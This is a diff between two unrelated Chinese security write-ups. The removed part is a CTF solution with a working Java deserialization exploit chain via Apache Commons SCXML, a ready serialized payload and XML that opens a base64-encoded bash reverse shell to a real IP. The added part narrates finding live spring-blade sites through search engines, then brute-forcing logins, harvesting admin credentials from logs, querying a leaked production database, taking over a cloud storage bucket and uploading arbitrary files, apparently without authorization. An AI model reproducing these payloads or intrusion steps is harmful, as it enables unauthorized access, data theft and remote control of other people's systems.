@@ -1,365 +1,218 @@
-## 解题
+# 对spring-blade框架站点的渗透技术分享
 
-重要源码
+## 前言
 
-其实就一个main
+在当今网络安全环境中，Web应用程序的安全性已成为企业及个人站点防护的重中之重。随着开源框架和快速开发工具的普及，诸如Blade这样的轻量级Java Web框架得到了广泛应用。然而，随着Web应用的广泛部署，黑客及恶意攻击者也在不断寻找漏洞，以利用框架或其部署的潜在缺陷进行入侵。为确保系统的安全性，定期进行渗透测试显得尤为重要。
 
-```php
-import com.sun.net.httpserver.HttpServer;
-import com.sun.net.httpserver.HttpHandler;
-import com.sun.net.httpserver.HttpExchange;
+文章中涉及的敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担。
 
-import java.io.*;
-import java.net.InetSocketAddress;
-import java.util.Base64;
+参考http://www.aqtd.com/nd.jsp?id=6693
 
-public class Test {
+## 站点信息寻找
 
-    public static void main(String[] args) throws IOException {
-        int port = Integer.parseInt(System.getenv().getOrDefault("PORT", "8000"));
-        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
-        server.createContext("/", new RequestHandler());
-        server.start();
-        System.out.printf("Server listening on :%s\n", port);
-    }
+一般我是通过图标去找的，因为特征感很强
 
-    static class RequestHandler implements HttpHandler {
-        @Override
-        public void handle(HttpExchange exchange) throws IOException {
-            String response;
-            int code = 200;
+https://sns.bladex.cn/article/2我随便搜了一下，有一个社区
 
-            switch (exchange.getRequestURI().getPath()) {
-                case "/scxml":
-                    response = handleScxmlRequest(exchange);
-                    break;
-                default:
-                    code = 404;
-                    response = "Not found";
-                    break;
-            }
+![image.png](https://image.3001.net/images/20241206/1733457865_675277c92f035306bd4f9.png!small)
 
-            exchange.sendResponseHeaders(code, response.length());
-            try (OutputStream os = exchange.getResponseBody()) {
-                os.write(response.getBytes());
-            }
-        }
 
-        private String handleScxmlRequest(HttpExchange exchange) {
-            String param = exchange.getRequestURI().getQuery();
-            if (param == null) {
-                return "No query parameter provided";
-            }
 
-            try {
-                byte[] decodedBytes = Base64.getDecoder().decode(param);
-                try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decodedBytes))) {
-                    return ois.readObject().toString();
-                }
-            } catch (Throwable e) {
-                e.printStackTrace();
-                return ":(";
-            }
-        }
-    }
-}
-```
+![image.png](https://image.3001.net/images/20241206/1733457884_675277dc80b4e11a69c3c.png!small)
 
-可以看见出口就是一个反序列化，然后会调用Tostring方法，这个就很奇怪，偏偏调用Tostring，全局查找tostring方法
+这样的特征很多，只需要找出icon就ok了
 
-找到如下代码
+fofa语法
 
 ```php
-//
-// Source code recreated from a .class file by IntelliJ IDEA
-// (powered by FernFlower decompiler)
-//
-
-package com.n1ght;
-
-import java.io.Serializable;
-import java.util.Map;
-import org.apache.commons.scxml2.invoke.Invoker;
-import org.apache.commons.scxml2.invoke.InvokerException;
-
-public class InvokerImpl implements Serializable {
-    private final Invoker o;
-    private final String source;
-    private final Map params;
-
-    public InvokerImpl(Invoker o, String source, Map params) {
-        this.o = o;
-        this.source = source;
-        this.params = params;
-    }
-
-    public String toString() {
-        try {
-            this.o.invoke(this.source, this.params);
-            return "success invoke";
-        } catch (InvokerException var2) {
-            throw new RuntimeException(var2);
-        }
-    }
-}
+icon_hash="1047841028"
 ```
 
-很明显的特征了，调用任意对应的invoke方法
+![image.png](https://image.3001.net/images/20241206/1733457972_6752783454bf822d26de6.png!small)
 
-逻辑只能是寻找实现了invoke接口的类了
+可以看见还是很多的8000多个
 
-直接来到了SimpleSCXMLInvoker类
+hunter中
 
-查看它的invoke方法
+hunter可能更方便，进入站点，找到文件
 
-```php
-public void invoke(String source, Map<String, Object> params) throws InvokerException {
-    SCXML scxml = null;
 
-    try {
-        scxml = SCXMLReader.read(new URL(source));
-    } catch (ModelException var9) {
-        throw new InvokerException(var9.getMessage(), var9.getCause());
-    } catch (IOException var10) {
-        throw new InvokerException(var10.getMessage(), var10.getCause());
-    } catch (XMLStreamException var11) {
-        throw new InvokerException(var11.getMessage(), var11.getCause());
-    }
 
-    Evaluator eval = this.parentSCInstance.getEvaluator();
-    this.executor = new SCXMLExecutor(eval, new SimpleDispatcher(), new SimpleErrorReporter());
-    Context rootCtx = eval.newContext((Context)null);
-    Iterator var6 = params.entrySet().iterator();
+然后直接放到hunter
 
-    while(var6.hasNext()) {
-        Map.Entry<String, Object> entry = (Map.Entry)var6.next();
-        rootCtx.setLocal((String)entry.getKey(), entry.getValue());
-    }
-
-    this.executor.setRootContext(rootCtx);
-    this.executor.setStateMachine(scxml);
-    this.executor.addListener(scxml, new SimpleSCXMLListener());
-    this.executor.registerInvokerClass("scxml", this.getClass());
-
-    try {
-        this.executor.go();
-    } catch (ModelException var8) {
-        throw new InvokerException(var8.getMessage(), var8.getCause());
-    }
-
-    if (this.executor.getCurrentStatus().isFinal()) {
-        TriggerEvent te = new TriggerEvent(this.eventPrefix + invokeDone, 3);
-        (new AsyncTrigger(this.parentSCInstance.getExecutor(), te)).start();
-    }
-
-}
-```
-
-观察lib
-
-![image-20240912223117504](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240912223117504.png)
-
-发现是有scxml包的，而这个依赖是有个漏洞的
-
-参考一下这位师傅的分析https://blog.pyn3rd.com/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/
-
-关键内容如下
-
-By convention, I eventually demostrate it with the explicit PoC.
-
-```
-import org.apache.commons.scxml2.SCXMLExecutor;
-import org.apache.commons.scxml2.io.SCXMLReader;
-import org.apache.commons.scxml2.model.ModelException;
-import org.apache.commons.scxml2.model.SCXML;
-
-import javax.xml.stream.XMLStreamException;
-import java.io.IOException;
-
-public class SCXMLDemo {
-    public static void main(String[] args) throws ModelException, XMLStreamException, IOException {
-
-        // engine to execute the scxml instance
-        SCXMLExecutor executor = new SCXMLExecutor();
-        // parse SCXML URL into SCXML model
-        SCXML scxml = SCXMLReader.read("http://127.0.0.1:8000/poc.xml");
-
-        // set state machine (scxml instance) to execute
-        executor.setStateMachine(scxml);
-        executor.go();
-
-    }
-}
-```
-
-poc.xml
-
-```
-<?xml version="1.0"?>
-<scxml xmlns="http://www.w3.org/2005/07/scxml" version="1.0" initial="run">
-<state id="run">
-<onentry>
-<script>
-''.getClass().forName('java.lang.Runtime').getRuntime().exec('open -a calculator')
-</script>
-</onentry>
-</state>
-</scxml>
-```
-
-The screenshot of this illustration.
-![upload successful](https://blog.pyn3rd.com/images/pasted-237.png)
-
-就是可以加载远程的xml文件，实现命令执行
-
-那其实答案就呼之欲出了
-
-## 利用链构造
-
-构造过程中有很多报错，根据报错一个一个解决就好了
-
-首先就是SimpleSCXMLInvoker要为parentSCInstance属性赋值
-
-```php
-private SCInstance parentSCInstance;
-```
-
-查看构造方法
-
-```php
-void setEvaluator(Evaluator evaluator) {
-    this.evaluator = evaluator;
-}
-```
-
-继续查看Evaluator
-
-有四个实现类，因为这里给了Jexl依赖
-
-![image-20240912223615914](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240912223615914.png)
-
-选用JexlEvaluator类
-
-```php
-public JexlEvaluator() {
-    this.jexlEngineSilent = this.jexlEngine.isSilent();
-    this.jexlEngineStrict = this.jexlEngine.isStrict();
-}
-```
-
-直接构造就ok
-
-然后就是对于params，其实不重要，只需要能够加载我的远程文件就好了
-
-然后就是source参数就是我们的远程地址
-
-```php
-http://ip:port/1.xml
-```
-
-## POC
-
-```php
-import com.n1ght.InvokerImpl;
-import org.apache.commons.scxml2.ErrorReporter;
-import org.apache.commons.scxml2.SCInstance;
-import org.apache.commons.scxml2.SCXMLExecutor;
-import org.apache.commons.scxml2.env.SimpleDispatcher;
-import org.apache.commons.scxml2.env.SimpleErrorReporter;
-import org.apache.commons.scxml2.env.jexl.JexlEvaluator;
-import org.apache.commons.scxml2.invoke.SimpleSCXMLInvoker;
-
-import java.io.*;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Field;
-import java.util.Base64;
-import java.util.HashMap;
-import java.util.Map;
-
-public class ser {
-    public static void main(String[] args) throws Exception {
-        ErrorReporter errorReporter = new SimpleErrorReporter();
-        SimpleDispatcher simpleDispatcher = new SimpleDispatcher();
-        JexlEvaluator jexlEvaluator = new JexlEvaluator();
-        SCXMLExecutor scxmlExecutor = new SCXMLExecutor(jexlEvaluator, simpleDispatcher, errorReporter);
-        Class<?> clazz = Class.forName("org.apache.commons.scxml2.SCInstance");
-        Constructor<?> constructor = clazz.getDeclaredConstructor(SCXMLExecutor.class);
-        constructor.setAccessible(true);
-        SCInstance scInstance = (SCInstance) constructor.newInstance(scxmlExecutor);
-        SimpleSCXMLInvoker simpleSCXMLInvoker = new SimpleSCXMLInvoker();
-        setFieldValue(scInstance, "evaluator", jexlEvaluator);
-        setFieldValue(simpleSCXMLInvoker, "parentSCInstance", scInstance);
-
-        String source = "http://ip/1.xml";
-        Map<String, String> params = new HashMap<>();
-        params.put("username", "testUser");
-
-        // 实例化 InvokerImpl
-        InvokerImpl invokerImpl = new InvokerImpl(simpleSCXMLInvoker, source, params);
-
-        // 序列化 InvokerImpl 并转换为 Base64
-        String serializedBase64 = serializeToBase64(invokerImpl);
-        System.out.println("Serialized InvokerImpl to Base64: " + serializedBase64);
-
-        // 反序列化 InvokerImpl
-        InvokerImpl deserializedInvokerImpl = deserializeFromBase64(serializedBase64);
-        System.out.println("InvokerImpl deserialized successfully.");
-        deserializedInvokerImpl.toString();
-    }
-
-    public static void setFieldValue(Object obj, String field, Object value) throws NoSuchFieldException, IllegalAccessException {
-        Class<?> clazz = obj.getClass();
-        Field fieldName = clazz.getDeclaredField(field);
-        fieldName.setAccessible(true);
-        fieldName.set(obj, value);
-    }
-
-    public static String serializeToBase64(Object obj) throws IOException {
-        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
-        objectOutputStream.writeObject(obj);
-        objectOutputStream.close();
-        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
-    }
-
-    public static InvokerImpl deserializeFromBase64(String base64) throws IOException, ClassNotFoundException {
-        byte[] data = Base64.getDecoder().decode(base64);
-        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(data);
-        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
-        return (InvokerImpl) objectInputStream.readObject();
-    }
-}
-```
-
-## 解题
-
-输出的内容如下
+![image-20240925205708900](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925205708900.png)
 
 ```java
-rO0ABXNyABVjb20ubjFnaHQuSW52b2tlckltcGyTOSc2zqCsvwIAA0wAAW90ACpMb3JnL2FwYWNoZS9jb21tb25zL3NjeG1sMi9pbnZva2UvSW52b2tlcjtMAAZwYXJhbXN0AA9MamF2YS91dGlsL01hcDtMAAZzb3VyY2V0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyADNvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLmludm9rZS5TaW1wbGVTQ1hNTEludm9rZXIAAAAAAAAAAQIABVoACWNhbmNlbGxlZEwAC2V2ZW50UHJlZml4cQB+AANMAAhleGVjdXRvcnQAKUxvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL1NDWE1MRXhlY3V0b3I7TAAQcGFyZW50U0NJbnN0YW5jZXQAJkxvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL1NDSW5zdGFuY2U7TAANcGFyZW50U3RhdGVJZHEAfgADeHAAcHBzcgAkb3JnLmFwYWNoZS5jb21tb25zLnNjeG1sMi5TQ0luc3RhbmNlAAAAAAAAAAICAApMAAtjb21wbGV0aW9uc3EAfgACTAAIY29udGV4dHNxAH4AAkwACWV2YWx1YXRvcnQAJUxvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL0V2YWx1YXRvcjtMAAhleGVjdXRvcnEAfgAGTAAJaGlzdG9yaWVzcQB+AAJMABRpbml0aWFsU2NyaXB0Q29udGV4dHQAI0xvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL0NvbnRleHQ7TAAOaW52b2tlckNsYXNzZXNxAH4AAkwACGludm9rZXJzcQB+AAJMABRub3RpZmljYXRpb25SZWdpc3RyeXQAMExvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL05vdGlmaWNhdGlvblJlZ2lzdHJ5O0wAC3Jvb3RDb250ZXh0cQB+AAt4cHNyACVqYXZhLnV0aWwuQ29sbGVjdGlvbnMkU3luY2hyb25pemVkTWFwG3P5CUtLOXsDAAJMAAFtcQB+AAJMAAVtdXRleHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4cQB+ABB4c3EAfgAOc3EAfgARP0AAAAAAAAB3CAAAABAAAAAAeHEAfgATeHNyADBvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLmVudi5qZXhsLkpleGxFdmFsdWF0b3IAAAAAAAAAAQIAAloAEGpleGxFbmdpbmVTaWxlbnRaABBqZXhsRW5naW5lU3RyaWN0eHAAAHNyACdvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLlNDWE1MRXhlY3V0b3IAAAAAAAAAAQIACFoACXN1cGVyU3RlcEwADWN1cnJlbnRTdGF0dXN0ACJMb3JnL2FwYWNoZS9jb21tb25zL3NjeG1sMi9TdGF0dXM7TAANZXJyb3JSZXBvcnRlcnQAKUxvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL0Vycm9yUmVwb3J0ZXI7TAAPZXZlbnRkaXNwYXRjaGVydAArTG9yZy9hcGFjaGUvY29tbW9ucy9zY3htbDIvRXZlbnREaXNwYXRjaGVyO0wAA2xvZ3QAIExvcmcvYXBhY2hlL2NvbW1vbnMvbG9nZ2luZy9Mb2c7TAAKc2NJbnN0YW5jZXEAfgAHTAAJc2VtYW50aWNzdAAqTG9yZy9hcGFjaGUvY29tbW9ucy9zY3htbDIvU0NYTUxTZW1hbnRpY3M7TAAMc3RhdGVNYWNoaW5ldAAnTG9yZy9hcGFjaGUvY29tbW9ucy9zY3htbDIvbW9kZWwvU0NYTUw7eHABc3IAIG9yZy5hcGFjaGUuY29tbW9ucy5zY3htbDIuU3RhdHVzAAAAAAAAAAECAAJMAAZldmVudHN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247TAAGc3RhdGVzdAAPTGphdmEvdXRpbC9TZXQ7eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhzcgARamF2YS51dGlsLkhhc2hTZXS6RIWVlri3NAMAAHhwdwwAAAAQP0AAAAAAAAB4c3IAMW9yZy5hcGFjaGUuY29tbW9ucy5zY3htbDIuZW52LlNpbXBsZUVycm9yUmVwb3J0ZXIAAAAAAAAAAQIAAUwAA2xvZ3EAfgAbeHBzcgArb3JnLmFwYWNoZS5jb21tb25zLmxvZ2dpbmcuaW1wbC5KZGsxNExvZ2dlckJmt5/gKqC8AgABTAAEbmFtZXEAfgADeHB0ADFvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLmVudi5TaW1wbGVFcnJvclJlcG9ydGVyc3IALm9yZy5hcGFjaGUuY29tbW9ucy5zY3htbDIuZW52LlNpbXBsZURpc3BhdGNoZXIAAAAAAAAAAQIAAUwAA2xvZ3EAfgAbeHBzcQB+ACl0AClvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLkV2ZW50RGlzcGF0Y2hlcnNxAH4AKXQAJ29yZy5hcGFjaGUuY29tbW9ucy5zY3htbDIuU0NYTUxFeGVjdXRvcnNxAH4ACXNxAH4ADnNxAH4AET9AAAAAAAAAdwgAAAAQAAAAAHhxAH4AM3hzcQB+AA5zcQB+ABE/QAAAAAAAAHcIAAAAEAAAAAB4cQB+ADV4cQB+ABZxAH4AHnNxAH4ADnNxAH4AET9AAAAAAAAAdwgAAAAQAAAAAHhxAH4AN3hwc3EAfgAOc3EAfgARP0AAAAAAAAB3CAAAABAAAAAAeHEAfgA5eHNxAH4ADnNxAH4AET9AAAAAAAAAdwgAAAAQAAAAAHhxAH4AO3hzcgAub3JnLmFwYWNoZS5jb21tb25zLnNjeG1sMi5Ob3RpZmljYXRpb25SZWdpc3RyeQAAAAAAAAABAgABTAAEcmVnc3EAfgACeHBzcQB+AA5zcQB+ABE/QAAAAAAAAHcIAAAAEAAAAAB4cQB+AD94cHNyADZvcmcuYXBhY2hlLmNvbW1vbnMuc2N4bWwyLnNlbWFudGljcy5TQ1hNTFNlbWFudGljc0ltcGwAAAAAAAAAAQIAAkwABmFwcExvZ3EAfgAbTAAQdGFyZ2V0Q29tcGFyYXRvcnQAQExvcmcvYXBhY2hlL2NvbW1vbnMvc2N4bWwyL3NlbWFudGljcy9UcmFuc2l0aW9uVGFyZ2V0Q29tcGFyYXRvcjt4cHNxAH4AKXQAKG9yZy5hcGFjaGUuY29tbW9ucy5zY3htbDIuU0NYTUxTZW1hbnRpY3NzcgA+b3JnLmFwYWNoZS5jb21tb25zLnNjeG1sMi5zZW1hbnRpY3MuVHJhbnNpdGlvblRhcmdldENvbXBhcmF0b3IAAAAAAAAAAQIAAHhwcHNxAH4ADnNxAH4AET9AAAAAAAAAdwgAAAAQAAAAAHhxAH4ASHhwc3EAfgAOc3EAfgARP0AAAAAAAAB3CAAAABAAAAAAeHEAfgBKeHNxAH4ADnNxAH4AET9AAAAAAAAAdwgAAAAQAAAAAHhxAH4ATHhzcQB+AD1zcQB+AA5zcQB+ABE/QAAAAAAAAHcIAAAAEAAAAAB4cQB+AE94cHBzcQB+ABE/QAAAAAAADHcIAAAAEAAAAAF0AAh1c2VybmFtZXQACHRlc3RVc2VyeHQAIGh0dHA6Ly80Ny4xMDAuMjIzLjE3Mzo4MDAwLzEueG1s
+web.icon="952438bb6af042855ed192384032e37b"
 ```
 
-xml内容如下
+
+
+![image-20240925205734065](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925205734065.png)
+
+
+
+## 弱密码登录+爆破
+
+我们随便找一个站
+
+![image-20240925210029719](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925210029719.png)
+
+可惜啊，这个验证码阻拦了我爆破的想法，可以试一试乱输入这个验证码会不会更新
+
+![image-20240925210521869](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925210521869.png)
+
+发现这个验证码根本不会更新，弱密码爆破一波
+
+
+发现密码被hash了，找个hash的字典爆破一下，最后好在运气好，爆出来了一个
+
+![image-20240925214528291](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925214528291.png)
+
+
+
+在个人信息界面可以修改密码和上传头像
+
+![image-20240925214613028](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925214613028.png)
+
+
+
+尝试了文件上传的各种绕过，绕不过
+
+发现这两个点是点不进去的，一点就说没有权限
+
+![image-20240925214857504](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925214857504.png)
+
+
+
+## 寻找数据文件
+
+当时不是说了吗，我正常访问，返回如下
 
 ```java
-<?xml version="1.0"?>
-<scxml xmlns="http://www.w3.org/2005/07/scxml" version="1.0" initial="run">
-        <state id="run">
-                <onentry>
-                        <script>
-                                ''.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzIuMjIyLjE5NS8yMzMzIDA+JjEK}|{base64,-d}|{bash,-i}')
-                        </script>
-                </onentry>
-        </state>
-</scxml>
-                         
+{"code":401,"success":false,"data":{},"msg":"请求未授权"}
 ```
 
+首先第一反应肯定是修改回包
+
+```java
+{"code":200,"success":true,"data":{},"msg":"success"}
+```
+
+但是不可以
+
+一堆尝试修修改改一下
+
+不行尝试读取一下日志文件
+
+发现了登录信息，喜喜，还有admin，password是md5编码的，去解一下
+
+![image-20240925220727199](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925220727199.png)
 
 
 
+我们拿去爆破一下
 
-![image-20240912223944361](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240912223944361.png)
+![image-20240925220946777](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925220946777.png)
+
+## admin权限用户
+
+![image-20240925221549284](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925221549284.png)
+
+可以看见admin用户功能点多了很多
+
+![image-20240925221244029](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925221244029.png)
 
 
-![image-20240912224002564](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240912224002564.png)
+
+有大量的信息泄露
+
+![image-20240925221459363](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925221459363.png)
+
+获取了很多账号，嘿嘿嘿，又可以去爆破了，但是都有admin了，不需要多此一举了
+
+可以查看日志记录，可以查看到其他用户登录的log，而且password都是一样的
+
+![image-20240925222803858](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925222803858.png)
+
+现在相当于获得所有的用户和密码了
+
+![image-20240925222819555](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925222819555.png)
+
+## 远程jdbc连接
+
+![image-20240925224023414](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925224023414.png)
+
+可以看到是泄露了jdbc的密码和账号，还有jdbc连接的地址的，我们可以远程连接
+
+sql语句select * from users
+
+虽然报错了，但是证明连接是成功了
+
+```java
+Exception in thread "main" java.sql.SQLSyntaxErrorException: Table 'construct.users' doesn't exist
+	at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:120)
+	at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:97)
+	at com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping.translateException(SQLExceptionsMapping.java:122)
+	at com.mysql.cj.jdbc.StatementImpl.executeQuery(StatementImpl.java:1218)
+	at MYSQL.JDBC_Connection_example.main(JDBC_Connection_example.java:20)
+
+```
+
+不过小问题，我们找找表的名字
+
+![image-20240925224335022](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925224335022.png)
+
+尝试查询一下
+
+懒得打码了，如下
+
+![image-20240925224423541](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925224423541.png)
+
+然后尝试jdbc命令执行，但是发现不行，因为自己菜
+
+当然都能够sql注入了，提取的方法还是有的，这里就不深入研究了
+
+## 阿里云储存桶
+
+可以看见是泄露了我们的key的，
+
+![image-20240925215210204](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240925215210204.png)
+
+可以接管文件系统了
+
+![image-20240926083954192](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240926083954192.png)
+
+可以任意文件读取和任意文件删除下载
+
+## 应用密钥泄露
+
+![](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240926013848135.png)
+
+## 任意文件上传
+
+在这个位置我们可以选择上传图片，经过测试，后端是没有验证的
+
+![image-20240926084544469](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240926084544469.png)
+
+保存后就上传成功
+
+![image-20240926084726034](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240926084726034.png)
+
+点击可以下载
+
+![image-20240926084743650](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240926084743650.png)
+
+
+
+不过对文件名做了处理，猜测是时间搓的md5
+
+可以去验证一下
+
+![image-20240926084904011](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240926084904011.png)
+
+确实是成功了
+
+## 最后
+
+文章中涉及的敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担。
